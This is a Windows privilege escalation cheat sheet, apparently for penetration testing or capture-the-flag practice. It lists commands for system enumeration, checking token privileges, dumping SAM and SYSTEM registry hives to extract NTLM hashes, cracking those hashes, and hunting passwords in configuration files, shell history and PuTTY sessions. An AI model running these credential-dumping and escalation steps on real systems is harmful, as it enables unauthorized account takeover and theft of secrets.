
### System Enumeration
Basic System Info
```bash
systeminfo                          # Detailed system config
hostname                            # Hostname
wmic qfe get Caption,Description,HotFixID,InstalledOn  # Installed patches
wmic logicaldisk get name          # Logical drives
net user                            # List all users
net user [username]                # Info about specific user
whoami                              # Current user
whoami /priv                        # Current user's privileges
```
 User Group and Privileges (Filtered View)
```bash
whoami /all | Select-String -Pattern "username" -Context 2,0
# Example: whoami /all | Select-String -Pattern "wade" -Context 2,0
```
View Folder Structure
```bash
tree /f    # Shows files and directories recursively
```
### Network Enumeration
```bash
ipconfig /all           # All IP config info
netstat -ano            # Active connections and listening ports
```
### Token Privilege Exploits
Check for SeImpersonatePrivilege

```bash
whoami /priv
```
Juicy Potato, RoguePotato, or PrintSpoofer can be used if enabled.

### Credential Dumping & Password Hunting
 Registry Hive Dump (requires SYSTEM privileges)
```bash
reg save HKLM\SAM SAM
reg save HKLM\SYSTEM SYSTEM
reg save HKLM\SECURITY SECURITY
```
 Extracting Hashes
```bash
samdump2 SYSTEM SAM    # Dumps NTLM hashes
```
 Cracking Hashes
```bash
john --format=nt hash.txt --wordlist=rockyou.txt
hashcat -m 1000 hash.txt rockyou.txt
```
### Saved Windows Credentials
```bash
cmdkey /list
```
### Look for Passwords in Configs and Registry
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```
### Sensitive File Discovery
 Unattended Installation Files
```bash
C:\Unattend.xml

C:\Windows\Panther\Unattend.xml

C:\Windows\Panther\Unattend\Unattend.xml

C:\Windows\system32\sysprep.inf

C:\Windows\system32\sysprep\sysprep.xml
```
 IIS/Web Config Files
```bash
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
### PowerShell History
View PowerShell Command History
```bash
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
In PowerShell:
```powershell
Get-Content $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Scheduled Tasks
List and Investigate Tasks
```bash
schtasks                      # List tasks
schtasks /query /tn <name> /fo list /v   # Details of specific task
icacls c:\tasks\schtask.bat   # Who can modify this task
```
### Installed Software (Look for Vulnerabilities)
List Installed Software with Version
```bash
wmic product get name,version,vendor
```
Use this info to:
- Search for unpatched versions
- Identify misconfigurations

### PuTTY Saved Sessions (Possible Proxy Credentials)
```bash
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
### Using Found Credentials to Gain Access
Use runas to switch user
```bash
runas.exe /user:<username> cmd
```
You’ll be prompted to enter the password. If successful and the user is admin → you get admin CMD.

🧠 Bonus: More Password Dump Tools
creddump7

```bash
./pwdump.py SYSTEM SAM
```
